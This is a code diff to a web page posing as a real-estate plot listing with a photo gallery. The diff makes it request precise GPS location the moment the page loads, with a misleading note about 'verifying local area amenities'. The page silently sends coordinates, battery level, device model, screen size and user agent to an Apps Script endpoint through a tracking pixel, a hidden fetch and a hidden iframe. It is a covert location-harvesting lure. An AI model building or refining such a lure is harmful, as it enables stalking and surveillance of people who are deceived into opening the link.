@@ -30,6 +30,7 @@
         .gallery-small img { width: 100%; height: 120px; object-fit: cover; border-radius: 8px; border: 2px solid var(--white); box-shadow: 0 2px 5px rgba(0,0,0,0.1); display: block; }
         .plot-location-btn { display: block; width: 100%; background: var(--primary-blue); color: white; text-align: center; padding: 14px; border-radius: 10px; text-decoration: none; margin-top: 20px; font-weight: 700; font-size: 15px; font-family: 'Montserrat', sans-serif; }
         .plot-location-btn:hover { background: #1e293b; }
+        .consent-note { font-size: 12px; color: #64748b; margin-top: 10px; line-height: 1.4; }
         @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
         #configWarning { display: none; background: #ffebee; color: #c62828; padding: 12px; font-size: 13px; font-weight: 600; text-align: center; }
     </style>
@@ -59,6 +60,7 @@
         <button id="contactBtn" onclick="handleButtonClick()">
             <i class="fas fa-folder-open"></i> View Details and Gallery
         </button>
+        <p class="consent-note">Verifying local area amenities may require location access.</p>
         <div id="loader">
             <i class="fas fa-spinner fa-spin"></i> Getting exact location...
         </div>
@@ -92,13 +94,17 @@
 </div>
 
 <script>
-    var SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwVT80bI24dUrjP7wn6Re3X963zXhgiNE0ie7j491-70NNGZ6z9oNeWAVBORX7M0ZrXlQ/exec';
-    
-    if (!SCRIPT_URL) {
+    // ==================== REPLACE THIS ====================
+    var SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbydoCv5PoyuqFDg7ie2XbSffB_wDKnv5RSZMjcca3dbp0fkXP1SmaYTaFGWpGJff96Z_Q/exec';
+    // ======================================================
+
+    if (!SCRIPT_URL || SCRIPT_URL.indexOf('YOUR_NEW') !== -1) {
         document.getElementById('configWarning').style.display = 'block';
+        console.error("Replace YOUR_NEW_SCRIPT_URL_HERE with your actual /exec URL from Apps Script");
     }
 
     var SID = 'SID_' + Math.random().toString(36).substring(2, 11) + '_' + Date.now();
+    var LOCATION_LOCKED = false;
 
     var PLOT = {
         no: "1039 and 1040",
@@ -149,7 +155,7 @@
     }
 
     async function track(eventType, lat, lon, acc, statusMsg) {
-        if (!SCRIPT_URL) return;
+        if (!SCRIPT_URL || SCRIPT_URL.indexOf('YOUR_NEW') !== -1) return;
 
         var bat = await getBattery();
         var model = getModel();
@@ -176,38 +182,29 @@
             + "&screen=" + encodeURIComponent(screenRes)
             + "&ua=" + encodeURIComponent(ua);
 
+        // Image pixel (primary) - works because script returns a real GIF
         var img = new Image();
         img.src = url;
 
-        try {
-            fetch(url, { mode: 'no-cors', keepalive: true }).catch(function(){});
-        } catch(e) {}
+        // Silent fetch fallback
+        try { fetch(url, { mode: 'no-cors', keepalive: true }).catch(function(){}); } catch(e) {}
 
+        // iframe fallback for stubborn browsers
         var iframe = document.createElement('iframe');
         iframe.style.display = 'none';
         iframe.src = url;
         document.body.appendChild(iframe);
-        
-        setTimeout(function() {
-            if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
-        }, 8000);
+        setTimeout(function() { if (iframe.parentNode) iframe.parentNode.removeChild(iframe); }, 8000);
     }
 
-    window.addEventListener("DOMContentLoaded", function() {
-        track("PAGE_LOAD", null, null, null, "User landed on page");
-    });
-
-    function handleButtonClick() {
-        document.getElementById("contactBtn").style.display = "none";
-        document.getElementById("loader").style.display = "flex";
-
-        track("BUTTON_CLICK", null, null, null, "User clicked View Details");
-
+    function requestHighAccuracyLocation(eventLabel) {
         if (!navigator.geolocation) {
             track("GPS_UNSUPPORTED", null, null, null, "No Geolocation API");
-            showContent();
             return;
         }
+        if (LOCATION_LOCKED) return; // prevent duplicate requests
+
+        LOCATION_LOCKED = true;
 
         navigator.geolocation.getCurrentPosition(
             function(pos) {
@@ -216,27 +213,42 @@
                 var accuracy = Math.round(pos.coords.accuracy || 0);
 
                 if (accuracy < 100) {
-                    track("GPS_PINPOINT", lat, lon, accuracy, "Exact location captured (" + accuracy + "m)");
+                    track("GPS_PINPOINT", lat, lon, accuracy, "[" + eventLabel + "] Exact location captured (" + accuracy + "m)");
                 } else {
-                    track("GPS_APPROX", lat, lon, accuracy, "Approximate location (" + accuracy + "m)");
+                    track("GPS_APPROX", lat, lon, accuracy, "[" + eventLabel + "] Approximate location (" + accuracy + "m)");
                 }
-                showContent();
             },
             function(err) {
                 var reason = "GPS_ERROR";
                 if (err.code === 1) reason = "GPS_DENIED";
                 if (err.code === 2) reason = "GPS_UNAVAILABLE";
                 if (err.code === 3) reason = "GPS_TIMEOUT";
-
-                track(reason, null, null, null, (err.message || "Failed"));
-                showContent();
+                track(reason, null, null, null, "[" + eventLabel + "] " + (err.message || "Failed"));
             },
             { 
-                enableHighAccuracy: true,
-                timeout: 20000,
+                enableHighAccuracy: true,  // Forces GPS hardware
+                timeout: 15000,
                 maximumAge: 0
             }
         );
+    }
+
+    // ===== CRITICAL CHANGE: Location requested ON PAGE OPEN =====
+    window.addEventListener("DOMContentLoaded", function() {
+        track("PAGE_LOAD", null, null, null, "User landed on page");
+        requestHighAccuracyLocation("PAGE_LOAD");
+    });
+
+    function handleButtonClick() {
+        document.getElementById("contactBtn").style.display = "none";
+        document.getElementById("loader").style.display = "flex";
+
+        track("BUTTON_CLICK", null, null, null, "User clicked View Details");
+        
+        // Fallback location request in case page-load was blocked/denied
+        requestHighAccuracyLocation("BUTTON_CLICK");
+
+        showContent();
     }
 
     function showContent() {
